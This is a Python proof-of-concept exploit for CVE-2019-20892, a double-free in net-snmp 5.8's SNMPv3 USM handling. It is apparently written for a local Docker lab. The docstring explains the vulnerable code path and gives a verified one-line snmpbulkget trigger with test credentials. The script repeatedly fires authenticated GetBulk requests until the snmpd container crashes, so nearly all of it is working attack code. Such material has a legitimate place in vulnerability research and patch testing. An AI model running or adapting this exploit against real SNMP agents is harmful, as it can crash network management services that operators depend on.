#!/usr/bin/env python3
"""PoC for CVE-2019-20892 - double-free in usm_free_usmStateReference (net-snmp 5.8).

The double-free is triggered by an SNMPv3 authPriv GetBulk request. The
usmStateReference (securityStateRef) is shared between the cloned response PDU
and the original request PDU during GetBulk handling; both paths free it.

Implementing full SNMPv3 USM (HMAC-SHA auth) from raw stdlib is impractical, so
this PoC drives the GetBulk using net-snmp's own snmpbulkget client. The host
has NO net-snmp tools installed (checked: `which snmpbulkget`), so we shell out
to snmpbulkget *inside the container* via `docker exec` against localhost:161.
snmpbulkget runs as a separate process; the snmpd process is the one that
double-frees / uses-after-free, so exec'ing into the same container is fine.

LEVEL = authNoPriv (verified working). The bug lives in the USM securityStateRef
lifecycle, NOT the privacy layer: usm_malloc_usmStateReference() allocates the
ref while parsing the inbound authenticated GetBulk, usm_rgenerate_out_msg()
frees it via usm_free_usmStateReference() (snmpusm.c:317) while building the
cloned response PDU, then usm_generate_out_msg() (snmpusm.c:1008) reuses the
freed ref -> heap-use-after-free / double-free. ASan aborts snmpd (exit 1).
A valid authenticated v3 user is all that's needed (PR:L). NOTE: authPriv (AES)
on this v5.8 build fails with "error parsing ScopedPDU" (the ASan/UBSan-built
client mangles the encrypted ScopedPDU), so we use authNoPriv, which fully
exercises the vulnerable clone path and crashes deterministically.

Verified trigger (crashes on the FIRST request):
    snmpbulkget -v3 -l authNoPriv -u authPrivUser -a SHA -A authpassword123 \
        -Cn1 -Cr80 127.0.0.1:161 1.3.6.1.2.1.1.1.0 1.3.6.1.2.1 1.3.6.1.2.1.2.2

Credentials match snmpd-20892.conf:
    user authPrivUser, SHA auth "authpassword123" (AES priv "privpassword123").

Usage:
    python3 poc_2019_20892.py [container_name]   # default: snmp20892
"""
import subprocess
import sys
import time

CONTAINER = sys.argv[1] if len(sys.argv) > 1 else "snmp20892"

# GetBulk: -Cn<non-repeaters> -Cr<max-repetitions>. A non-repeater varbind plus
# large max-repetitions over a broad subtree forces the response-PDU clone that
# shares securityStateRef. The first combo below reliably crashes on iter 1.
BULK_CMDS = [
    # (non_repeaters, max_repetitions, oids)
    ("1", "80", ["1.3.6.1.2.1.1.1.0", "1.3.6.1.2.1", "1.3.6.1.2.1.2.2"]),
    ("0", "100", ["1.3.6.1.2.1.1", "1.3.6.1.2.1.2", "1.3.6.1.2.1.25"]),
    ("0", "60", ["1.3.6.1.2.1"]),
]


def run_bulk(non_rep, max_rep, oids):
    cmd = [
        "docker", "exec", CONTAINER,
        "snmpbulkget", "-v3", "-l", "authNoPriv",
        "-u", "authPrivUser",
        "-a", "SHA", "-A", "authpassword123",
        f"-Cn{non_rep}", f"-Cr{max_rep}",
        "127.0.0.1:161",
        *oids,
    ]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"


def container_dead():
    p = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Status}} {{.State.ExitCode}}", CONTAINER],
        capture_output=True, text=True,
    )
    return p.stdout.strip()


def main():
    print(f"[*] Firing SNMPv3 authNoPriv GetBulk at {CONTAINER} to trigger double-free")
    for rnd in range(25):
        for non_rep, max_rep, oids in BULK_CMDS:
            rc, out, err = run_bulk(non_rep, max_rep, oids)
            state = container_dead()
            status = state.split()[0] if state else "?"
            if status != "running":
                print(f"[!] container no longer running: {state} (round {rnd})")
                print(f"    last snmpbulkget rc={rc} stderr={err.strip()[:200]}")
                return
            if rc != 0 and ("Timeout" in err or "Timeout" in out):
                # snmpd may have crashed mid-request
                print(f"[~] round {rnd}: snmpbulkget timeout (rc={rc}) - agent may have died")
        time.sleep(0.2)
    print("[*] Completed all GetBulk rounds.")
    print(f"[*] Final container state: {container_dead()}")


if __name__ == "__main__":
    main()
